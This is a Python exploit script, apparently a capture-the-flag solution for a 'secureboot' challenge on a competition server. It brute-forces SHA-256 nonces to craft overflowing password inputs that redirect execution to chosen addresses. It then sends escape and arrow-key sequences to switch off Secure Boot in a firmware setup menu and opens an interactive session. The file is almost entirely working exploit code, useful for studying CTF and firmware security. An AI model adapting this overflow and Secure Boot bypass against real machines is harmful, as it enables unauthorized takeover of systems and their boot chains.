#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import hashlib
import telnetlib

context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'PROC', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':['./run_gdb.py']}, \
                        local   = {'argv':['./run.py']}, \
                        remote  = {'host':'secureboot.ctfcompetition.com', 'port':1337})
env.select()

#==========

addr_bin_base = 0x67cb000

ESC  = '\x1b'
UP   = '\x1b\x5b\x41'
DOWN = '\x1b\x5b\x42'

#==========

def attack(conn, **kwargs):
    conn.sendline = lambda x : conn.send(x+'\x0d')

    conn.send(ESC*0x40)

    p = find_hash('\xeb\x5a', addr_bin_base + 0x10008, 101158)
    conn.sendlineafter('Password?\r\n', p)

    p = find_hash('\x75\x45', addr_bin_base + 0x0ffc1, 20553)
    conn.sendlineafter('Password?\r\n', p)

    conn.sendlineafter('Device Manage', DOWN)
    conn.sendlineafter('Secure Boot Configuration', '')
    conn.sendlineafter('Attempt Secure Boot', DOWN)
    conn.sendlineafter('Configuration changed', '')

    conn.send(ESC*0x2)

    conn.sendlineafter('Continue', DOWN*3)
    conn.sendlineafter('Press ENTER to reset', '')

def find_hash(h, addr, x = None):
    if x is not None:
        return str(x).ljust(0x88, 'X')+p32(addr)

    hash_target = h.encode('hex')
    for nonce in xrange(2**32):
        hash_result = hashlib.sha256(str(nonce).ljust(0x80, 'X')+p64(0)+p32(addr)).hexdigest()

        if(hash_result[:len(hash_target)] == hash_target):
            print "Success with nonce %d" % nonce
            print "Hash is %s" % hash_result
            return str(nonce).ljust(0x88, 'X')+p32(addr)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)

    if env.check('remote'):
        t = telnetlib.Telnet()
        t.sock = comn.connection.sock
        t.interact()
    else:
        comn.connection.interactive()

#==========
